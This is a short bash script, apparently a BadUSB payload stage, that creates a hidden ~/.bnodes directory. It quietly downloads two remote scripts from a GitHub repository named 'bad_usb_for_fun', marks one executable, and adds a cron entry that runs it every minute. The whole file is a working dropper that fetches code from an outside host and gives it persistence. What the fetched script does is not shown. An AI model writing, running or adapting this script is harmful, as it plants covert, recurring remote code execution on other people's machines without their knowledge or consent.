#!/bin/bash

bnodes_dir="$HOME/.bnodes"
bexecute_file="$bnodes_dir/.bexecute.sh"
buninstall_file="$bnodes_dir/.buninstall.sh"

[ ! -d "$bnodes_dir" ] && mkdir -p "$bnodes_dir"
wget -q -O "$bexecute_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/bexecute.sh"
wget -q -O "$buninstall_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/buninstall.sh"
chmod +x $bexecute_file

cronjob="*/1 * * * * ~/.bnodes/.bexecute.sh"
crontab -l | grep -F "$cronjob" > /dev/null
if [ $? -eq 1 ]; then
    (crontab -l 2>/dev/null; echo "$cronjob") | crontab -
fi
